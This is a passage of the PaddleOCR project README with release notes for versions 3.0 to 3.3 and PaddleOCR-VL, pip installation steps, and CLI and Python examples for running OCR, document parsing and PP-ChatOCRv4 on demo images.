Official Website&lt;/a&gt;.&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;strong&gt;Core Features:&lt;/strong&gt; 
    &lt;ul&gt; 
     &lt;li&gt;&lt;strong&gt;SOTA Performance in Document Parsing:&lt;/strong&gt; PaddleOCR-VL-1.5 achieved a high precision of &lt;strong&gt;94.5%&lt;/strong&gt; on the OmniDocBench v1.5 benchmark, surpassing top-tier global general large models and specialized document parsing models.&lt;/li&gt; 
     &lt;li&gt;&lt;strong&gt;SOTA Performance Across 5 Real-World Scenarios:&lt;/strong&gt; Introducing an innovative document parsing approach, it is the first to support irregular document layout positioning. It outperforms open-source and closed-source models across all the five real-world scenarios: skew, warping, scanning, varied lighting, and screen photography.&lt;/li&gt; 
     &lt;li&gt;&lt;strong&gt;Capability Expansion Based on a 0.9B Compact Model:&lt;/strong&gt; With a parameter size of just 0.9B, PaddleOCR-VL-1.5 has expanded its scope to include text spotting, and seal recognition, setting new SOTA results across these related tasks.&lt;/li&gt; 
     &lt;li&gt;&lt;strong&gt;Enhanced Multi-Element Recognition:&lt;/strong&gt; The model features improved recognition performance for specific scenarios and multi-language content, including special symbols, ancient texts, multi-language tables, underlines, and checkboxes. Language coverage has been expanded to include &lt;strong&gt;Tibetan and Bengali&lt;/strong&gt;.&lt;/li&gt; 
     &lt;li&gt;&lt;strong&gt;Long Document Cross-Page Parsing:&lt;/strong&gt; The model supports automatic merging of cross-page tables and the identification of cross-page paragraph headings, effectively solving the issue of content fragmentation in long document parsing.&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.10.16: Release of PaddleOCR 3.3.0&lt;/strong&gt;&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;Released PaddleOCR-VL:&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt; &lt;p&gt;&lt;strong&gt;Model Introduction&lt;/strong&gt;:&lt;/p&gt; 
     &lt;ul&gt; 
      &lt;li&gt;&lt;strong&gt;PaddleOCR-VL&lt;/strong&gt; is a SOTA and resource-efficient model tailored for document parsing. Its core component is PaddleOCR-VL-0.9B, a compact yet powerful vision-language model (VLM) that integrates a NaViT-style dynamic resolution visual encoder with the ERNIE-4.5-0.3B language model to enable accurate element recognition. &lt;strong&gt;This innovative model efficiently supports 109 languages and excels in recognizing complex elements (e.g., text, tables, formulas, and charts), while maintaining minimal resource consumption&lt;/strong&gt;. Through comprehensive evaluations on widely used public benchmarks and in-house benchmarks, PaddleOCR-VL achieves SOTA performance in both page-level document parsing and element-level recognition. It significantly outperforms existing solutions, exhibits strong competitiveness against top-tier VLMs, and delivers fast inference speeds. These strengths make it highly suitable for practical deployment in real-world scenarios. The model has been released on &lt;a href="https://huggingface.co/PaddlePaddle/PaddleOCR-VL"&gt;HuggingFace&lt;/a&gt;. Everyone is welcome to download and use it! More introduction infomation can be found in &lt;a href="https://www.paddleocr.ai/latest/version3.x/algorithm/PaddleOCR-VL/PaddleOCR-VL.html"&gt;PaddleOCR-VL&lt;/a&gt;.&lt;/li&gt; 
     &lt;/ul&gt; &lt;/li&gt; 
    &lt;li&gt; &lt;p&gt;&lt;strong&gt;Core Features&lt;/strong&gt;:&lt;/p&gt; 
     &lt;ul&gt; 
      &lt;li&gt;&lt;strong&gt;Compact yet Powerful VLM Architecture&lt;/strong&gt;: We present a novel vision-language model that is specifically designed for resource-efficient inference, achieving outstanding performance in element recognition. By integrating a NaViT-style dynamic high-resolution visual encoder with the lightweight ERNIE-4.5-0.3B language model, we significantly enhance the model‚Äôs recognition capabilities and decoding efficiency. This integration maintains high accuracy while reducing computational demands, making it well-suited for efficient and practical document processing applications.&lt;/li&gt; 
      &lt;li&gt;&lt;strong&gt;SOTA Performance on Document Parsing&lt;/strong&gt;: PaddleOCR-VL achieves state-of-the-art performance in both page-level document parsing and element-level recognition. It significantly outperforms existing pipeline-based solutions and exhibiting strong competitiveness against leading vision-language models (VLMs) in document parsing. Moreover, it excels in recognizing complex document elements, such as text, tables, formulas, and charts, making it suitable for a wide range of challenging content types, including handwritten text and historical documents. This makes it highly versatile and suitable for a wide range of document types and scenarios.&lt;/li&gt; 
      &lt;li&gt;&lt;strong&gt;Multilingual Support&lt;/strong&gt;: PaddleOCR-VL Supports 109 languages, covering major global languages, including but not limited to Chinese, English, Japanese, Latin, and Korean, as well as languages with different scripts and structures, such as Russian (Cyrillic script), Arabic, Hindi (Devanagari script), and Thai. This broad language coverage substantially enhances the applicability of our system to multilingual and globalized document processing scenarios.&lt;/li&gt; 
     &lt;/ul&gt; &lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Released PP-OCRv5 Multilingual Recognition Model:&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Improved the accuracy and coverage of Latin script recognition; added support for Cyrillic, Arabic, Devanagari, Telugu, Tamil, and other language systems, covering recognition of 109 languages. The model has only 2M parameters, and the accuracy of some models has increased by over 40% compared to the previous generation.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.08.21: Release of PaddleOCR 3.2.0&lt;/strong&gt;&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Significant Model Additions:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Introduced training, inference, and deployment for PP-OCRv5 recognition models in English, Thai, and Greek. &lt;strong&gt;The PP-OCRv5 English model delivers an 11% improvement in English scenarios compared to the main PP-OCRv5 model, with the Thai and Greek recognition models achieving accuracies of 82.68% and 89.28%, respectively.&lt;/strong&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Deployment Capability Upgrades:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Full support for PaddlePaddle framework versions 3.1.0 and 3.1.1.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;Comprehensive upgrade of the PP-OCRv5 C++ local deployment solution, now supporting both Linux and Windows, with feature parity and identical accuracy to the Python implementation.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;High-performance inference now supports CUDA 12, and inference can be performed using either the Paddle Inference or ONNX Runtime backends.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;The high-stability service-oriented deployment solution is now fully open-sourced, allowing users to customize Docker images and SDKs as required.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;The high-stability service-oriented deployment solution also supports invocation via manually constructed HTTP requests, enabling client-side code development in any programming language.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Benchmark Support:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;All production lines now support fine-grained benchmarking, enabling measurement of end-to-end inference time as well as per-layer and per-module latency data to assist with performance analysis. &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/docs/version3.x/pipeline_usage/instructions/benchmark.en.md"&gt;Here's&lt;/a&gt; how to set up and use the benchmark feature.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;Documentation has been updated to include key metrics for commonly used configurations on mainstream hardware, such as inference latency and memory usage, providing deployment references for users.&lt;/strong&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Bug Fixes:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Resolved the issue of failed log saving during model training.&lt;/li&gt; 
    &lt;li&gt;Upgraded the data augmentation component for formula models for compatibility with newer versions of the albumentations dependency, and fixed deadlock warnings when using the tokenizers package in multi-process scenarios.&lt;/li&gt; 
    &lt;li&gt;Fixed inconsistencies in switch behaviors (e.g., &lt;code&gt;use_chart_parsing&lt;/code&gt;) in the PP-StructureV3 configuration files compared to other pipelines.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Other Enhancements:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Separated core and optional dependencies. Only minimal core dependencies are required for basic text recognition; additional dependencies for document parsing and information extraction can be installed as needed.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;Enabled support for NVIDIA RTX 50 series graphics cards on Windows; users can refer to the &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/docs/version3.x/installation.en.md"&gt;installation guide&lt;/a&gt; for the corresponding PaddlePaddle framework versions.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;PP-OCR series models now support returning single-character coordinates.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;Added AIStudio, ModelScope, and other model download sources, allowing users to specify the source for model downloads.&lt;/li&gt; 
    &lt;li&gt;Added support for chart-to-table conversion via the PP-Chart2Table module.&lt;/li&gt; 
    &lt;li&gt;Optimized documentation descriptions to improve usability.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.08.15: PaddleOCR 3.1.1 Released&lt;/strong&gt;&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Bug Fixes:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Added the missing methods &lt;code&gt;save_vector&lt;/code&gt;, &lt;code&gt;save_visual_info_list&lt;/code&gt;, &lt;code&gt;load_vector&lt;/code&gt;, and &lt;code&gt;load_visual_info_list&lt;/code&gt; in the &lt;code&gt;PP-ChatOCRv4&lt;/code&gt; class.&lt;/li&gt; 
    &lt;li&gt;Added the missing parameters &lt;code&gt;glossary&lt;/code&gt; and &lt;code&gt;llm_request_interval&lt;/code&gt; to the &lt;code&gt;translate&lt;/code&gt; method in the &lt;code&gt;PPDocTranslation&lt;/code&gt; class.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Documentation Improvements:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Added a demo to the MCP documentation.&lt;/li&gt; 
    &lt;li&gt;Added information about the PaddlePaddle and PaddleOCR version used for performance metrics testing in the documentation.&lt;/li&gt; 
    &lt;li&gt;Fixed errors and omissions in the production line document translation.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Others:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Changed the MCP server dependency to use the pure Python library &lt;code&gt;puremagic&lt;/code&gt; instead of &lt;code&gt;python-magic&lt;/code&gt; to reduce installation issues.&lt;/li&gt; 
    &lt;li&gt;Retested PP-OCRv5 performance metrics with PaddleOCR version 3.1.0 and updated the documentation.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.06.29: PaddleOCR 3.1.0 Released&lt;/strong&gt;&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Key Models and Pipelines:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Added PP-OCRv5 Multilingual Text Recognition Model&lt;/strong&gt;, which supports the training and inference process for text recognition models in 37 languages, including French, Spanish, Portuguese, Russian, Korean, etc. &lt;strong&gt;Average accuracy improved by over 30%.&lt;/strong&gt; &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/algorithm/PP-OCRv5/PP-OCRv5_multi_languages.html"&gt;Details&lt;/a&gt;&lt;/li&gt; 
    &lt;li&gt;Upgraded the &lt;strong&gt;PP-Chart2Table model&lt;/strong&gt; in PP-StructureV3, further enhancing the capability of converting charts to tables. On internal custom evaluation sets, the metric (RMS-F1) &lt;strong&gt;increased by 9.36 percentage points (71.24% -&amp;gt; 80.60%).&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;Newly launched &lt;strong&gt;document translation pipeline, PP-DocTranslation, based on PP-StructureV3 and ERNIE 4.5&lt;/strong&gt;, which supports the translation of Markdown format documents, various complex-layout PDF documents, and document images, with the results saved as Markdown format documents. &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/pipeline_usage/PP-DocTranslation.html"&gt;Details&lt;/a&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;New MCP server:&lt;/strong&gt; &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/mcp_server.html"&gt;Details&lt;/a&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Supports both OCR and PP-StructureV3 pipelines.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;Supports three working modes: local Python library, AIStudio Community Cloud Service, and self-hosted service.&lt;/li&gt; 
    &lt;li&gt;Supports invoking local services via stdio and remote services via Streamable HTTP.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Documentation Optimization:&lt;/strong&gt; Improved the descriptions in some user guides for a smoother reading experience.&lt;/p&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.06.26: PaddleOCR 3.0.3 Released&lt;/strong&gt;&lt;/summary&gt; - Bug Fix: Resolved the issue where the `enable_mkldnn` parameter was not effective, restoring the default behavior of using MKL-DNN for CPU inference. 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.06.19: PaddleOCR 3.0.2 Released&lt;/strong&gt;&lt;/summary&gt; - **New Features:** 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;The default download source has been changed from &lt;code&gt;BOS&lt;/code&gt; to &lt;code&gt;HuggingFace&lt;/code&gt;. Users can also change the environment variable &lt;code&gt;PADDLE_PDX_MODEL_SOURCE&lt;/code&gt; to &lt;code&gt;BOS&lt;/code&gt; to set the model download source back to Baidu Object Storage (BOS).&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Added service invocation examples for six languages‚ÄîC++, Java, Go, C#, Node.js, and PHP‚Äîfor pipelines like PP-OCRv5, PP-StructureV3, and PP-ChatOCRv4.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Improved the layout partition sorting algorithm in the PP-StructureV3 pipeline, enhancing the sorting logic for complex vertical layouts to deliver better results.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Enhanced model selection logic: when a language is specified but a model version is not, the system will automatically select the latest model version supporting that language.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Set a default upper limit for MKL-DNN cache size to prevent unlimited growth, while also allowing users to configure cache capacity.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Updated default configurations for high-performance inference to support Paddle MKL-DNN acceleration and optimized the logic for automatic configuration selection for smarter choices.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Adjusted the logic for obtaining the default device to consider the actual support for computing devices by the installed Paddle framework, making program behavior more intuitive.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Added Android example for PP-OCRv5. &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/on_device_deployment.html"&gt;Details&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Bug Fixes:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Fixed an issue with some CLI parameters in PP-StructureV3 not taking effect.&lt;/li&gt; 
    &lt;li&gt;Resolved an issue where &lt;code&gt;export_paddlex_config_to_yaml&lt;/code&gt; would not function correctly in certain cases.&lt;/li&gt; 
    &lt;li&gt;Corrected the discrepancy between the actual behavior of &lt;code&gt;save_path&lt;/code&gt; and its documentation description.&lt;/li&gt; 
    &lt;li&gt;Fixed potential multithreading errors when using MKL-DNN in basic service deployment.&lt;/li&gt; 
    &lt;li&gt;Corrected channel order errors in image preprocessing for the Latex-OCR model.&lt;/li&gt; 
    &lt;li&gt;Fixed channel order errors in saving visualized images within the text recognition module.&lt;/li&gt; 
    &lt;li&gt;Resolved channel order errors in visualized table results within PP-StructureV3 pipeline.&lt;/li&gt; 
    &lt;li&gt;Fixed an overflow issue in the calculation of &lt;code&gt;overlap_ratio&lt;/code&gt; under extremely special circumstances in the PP-StructureV3 pipeline.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Documentation Improvements:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Updated the description of the &lt;code&gt;enable_mkldnn&lt;/code&gt; parameter in the documentation to accurately reflect the program's actual behavior.&lt;/li&gt; 
    &lt;li&gt;Fixed errors in the documentation regarding the &lt;code&gt;lang&lt;/code&gt; and &lt;code&gt;ocr_version&lt;/code&gt; parameters.&lt;/li&gt; 
    &lt;li&gt;Added instructions for exporting pipeline configuration files via CLI.&lt;/li&gt; 
    &lt;li&gt;Fixed missing columns in the performance data table for PP-OCRv5.&lt;/li&gt; 
    &lt;li&gt;Refined benchmark metrics for PP-StructureV3 across different configurations.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Others:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Relaxed version restrictions on dependencies like numpy and pandas, restoring support for Python 3.12.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;History Log&lt;/strong&gt;&lt;/summary&gt; 
 &lt;p&gt;2025.06.05: &lt;strong&gt;PaddleOCR 3.0.1 Released&lt;/strong&gt;, includes:&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;strong&gt;Optimisation of certain models and model configurations:&lt;/strong&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Updated the default model configuration for PP-OCRv5, changing both detection and recognition from mobile to server models. To improve default performance in most scenarios, the parameter &lt;code&gt;limit_side_len&lt;/code&gt; in the configuration has been changed from 736 to 64.&lt;/li&gt; 
    &lt;li&gt;Added a new text line orientation classification model &lt;code&gt;PP-LCNet_x1_0_textline_ori&lt;/code&gt; with an accuracy of 99.42%. The default text line orientation classifier for OCR, PP-StructureV3, and PP-ChatOCRv4 pipelines has been updated to this model.&lt;/li&gt; 
    &lt;li&gt;Optimized the text line orientation classification model &lt;code&gt;PP-LCNet_x0_25_textline_ori&lt;/code&gt;, improving accuracy by 3.3 percentage points to a current accuracy of 98.85%.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Optimizations and fixes for some issues in version 3.0.0, &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/update/update.html"&gt;details&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;üî•üî•2025.05.20: Official Release of &lt;strong&gt;PaddleOCR v3.0&lt;/strong&gt;, including:&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-OCRv5&lt;/strong&gt;: High-Accuracy Text Recognition Model for All Scenarios - Instant Text from Images/PDFs.&lt;/p&gt; 
   &lt;ol&gt; 
    &lt;li&gt;üåê Single-model support for &lt;strong&gt;five&lt;/strong&gt; text types - Seamlessly process &lt;strong&gt;Simplified Chinese, Traditional Chinese, Simplified Chinese Pinyin, English&lt;/strong&gt; and &lt;strong&gt;Japanese&lt;/strong&gt; within a single model.&lt;/li&gt; 
    &lt;li&gt;‚úçÔ∏è Improved &lt;strong&gt;handwriting recognition&lt;/strong&gt;: Significantly better at complex cursive scripts and non-standard handwriting.&lt;/li&gt; 
    &lt;li&gt;üéØ &lt;strong&gt;13-point accuracy gain&lt;/strong&gt; over PP-OCRv4, achieving state-of-the-art performance across a variety of real-world scenarios.&lt;/li&gt; 
   &lt;/ol&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-StructureV3&lt;/strong&gt;: General-Purpose Document Parsing ‚Äì Unleash SOTA Images/PDFs Parsing for Real-World Scenarios!&lt;/p&gt; 
   &lt;ol&gt; 
    &lt;li&gt;üßÆ &lt;strong&gt;High-Accuracy multi-scene PDF parsing&lt;/strong&gt;, leading both open- and closed-source solutions on the OmniDocBench benchmark.&lt;/li&gt; 
    &lt;li&gt;üß† Specialized capabilities include &lt;strong&gt;seal recognition&lt;/strong&gt;, &lt;strong&gt;chart-to-table conversion&lt;/strong&gt;, &lt;strong&gt;table recognition with nested formulas/images&lt;/strong&gt;, &lt;strong&gt;vertical text document parsing&lt;/strong&gt;, and &lt;strong&gt;complex table structure analysis&lt;/strong&gt;.&lt;/li&gt; 
   &lt;/ol&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-ChatOCRv4&lt;/strong&gt;: Intelligent Document Understanding ‚Äì Extract Key Information, not just text from Images/PDFs.&lt;/p&gt; 
   &lt;ol&gt; 
    &lt;li&gt;üî• &lt;strong&gt;15-point accuracy gain&lt;/strong&gt; in key-information extraction on PDF/PNG/JPG files over the previous generation.&lt;/li&gt; 
    &lt;li&gt;üíª Native support for &lt;strong&gt;ERNIE 4.5&lt;/strong&gt;, with compatibility for large-model deployments via PaddleNLP, Ollama, vLLM, and more.&lt;/li&gt; 
    &lt;li&gt;ü§ù Integrated &lt;a href="https://github.com/PaddlePaddle/PaddleMIX/tree/develop/paddlemix/examples/ppdocbee2"&gt;PP-DocBee2&lt;/a&gt;, enabling extraction and understanding of printed text, handwriting, seals, tables, charts, and other common elements in complex documents.&lt;/li&gt; 
   &lt;/ol&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/update/update.html"&gt;History Log&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;h2&gt;‚ö° Quick Start&lt;/h2&gt; 
&lt;h3&gt;1. Run online demo&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://aistudio.baidu.com/community/app/91660/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP_OCRv5-AI_Studio-green" alt="AI Studio" /&gt;&lt;/a&gt; &lt;a href="https://aistudio.baidu.com/community/app/518494/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP_StructureV3-AI_Studio-green" alt="AI Studio" /&gt;&lt;/a&gt; &lt;a href="https://aistudio.baidu.com/community/app/518493/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP_ChatOCRv4-AI_Studio-green" alt="AI Studio" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;2. Installation&lt;/h3&gt; 
&lt;p&gt;Install PaddlePaddle refer to &lt;a href="https://www.paddlepaddle.org.cn/en/install/quick?docurl=/documentation/docs/en/develop/install/pip/linux-pip_en.html"&gt;Installation Guide&lt;/a&gt;, after then, install the PaddleOCR toolkit.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# If you only want to use the basic text recognition feature (returns text position coordinates and content), including the PP-OCR series
python -m pip install paddleocr
# If you want to use all features such as document parsing, document understanding, document translation, key information extraction, etc.
# python -m pip install "paddleocr[all]"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Starting from version 3.2.0, in addition to the &lt;code&gt;all&lt;/code&gt; dependency group demonstrated above, PaddleOCR also supports installing partial optional features by specifying other dependency groups. All dependency groups provided by PaddleOCR are as follows:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Dependency Group Name&lt;/th&gt; 
   &lt;th&gt;Corresponding Functionality&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;doc-parser&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Document parsing: can be used to extract layout elements such as tables, formulas, stamps, images, etc. from documents; includes models like PP-StructureV3, PaddleOCR-VL&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;ie&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Information extraction: can be used to extract key information from documents, such as names, dates, addresses, amounts, etc.; includes models like PP-ChatOCRv4&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;trans&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Document translation: can be used to translate documents from one language to another; includes models like PP-DocTranslation&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;all&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Complete functionality&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;3. Run inference by CLI&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Run PP-OCRv5 inference
paddleocr ocr -i https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/general_ocr_002.png --use_doc_orientation_classify False --use_doc_unwarping False --use_textline_orientation False  

# Run PP-StructureV3 inference
paddleocr pp_structurev3 -i https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/pp_structure_v3_demo.png --use_doc_orientation_classify False --use_doc_unwarping False

# Get the Qianfan API Key at first, and then run PP-ChatOCRv4 inference
paddleocr pp_chatocrv4_doc -i https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/vehicle_certificate-1.png -k È©æÈ©∂ÂÆ§ÂáÜ‰πò‰∫∫Êï∞ --qianfan_api_key your_api_key --use_doc_orientation_classify False --use_doc_unwarping False 

# Run PaddleOCR-VL inference
paddleocr doc_parser -i https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/paddleocr_vl_demo.png

# Get more information about "paddleocr ocr"
paddleocr ocr --help
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;4. Run inference by API&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;4.1 PP-OCRv5 Example&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Initialize PaddleOCR instance
from paddleocr import PaddleOCR
ocr = PaddleOCR(
    use_doc_orientation_classify=False,
    use_doc_unwarping=False,
    use_textline_orientation=False)

# Run OCR inference on a sample image 
result = ocr.predict(
    input="https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/general_ocr_002.png")

# Visualize the results and save the JSON results
for res in result:
    res.print()
    res.save_to_img("output")
    res.save_to_json("output")
&lt;/code&gt;&lt;/pre&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;4.2 PP-StructureV3 Example&lt;/strong&gt;&lt;/summary&gt; 
 &lt;pre&gt;&lt;code class="language-python"&gt;from pathlib import Path
from paddleocr import PPStructureV3

pipeline = PPStructureV3(
    use_doc_orientation_classify=False,
    use_doc_unwarping=False
)

# For Image
output = pipeline.predict(
    input="https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/pp_structure_v3_demo.png",
)

# Visualize the results and save the JSON results
for res in output:
    res.print() 
    res.save_to_json(save_path="output") 
    res.save_to_markdown(save_path="output")           
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;4.3 PP-ChatOCRv4 Example&lt;/strong&gt;&lt;/summary&gt; 
 &lt;pre&gt;&lt;code class="language-python"&gt;from paddleocr import PPChatOCRv4Doc

chat_bot_config = {
    "module_name": "chat_bot",
    "model_name": "ernie-3.5-8k",
    "base_url": "https://qianfan.baidubce.com/v2",
    "api_type": "openai",
    "api_key": "api_key",  # your api_key
}

retriever_config = {
    "module_name": "retriever",
    "model_name": "embedding-v1",
    "base_url": "https://qianfan.baidubce.com/v2",
    "api_type": "qianfan",
    "api_key": "api_key",  # your api_key
}

pipeline = PPChatOCRv4Doc(
    use_doc_orientation_classify=False,
    use_doc_unwarping=False
)

visual_predict_res = pipeline.visual_predict(
    input="https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/vehicle_certificate-1.png",
    use_common_ocr=True,
    use_seal_recognition=True,
    use_table_recognition=True,
)

mllm_predict_info = None
use_mllm = False
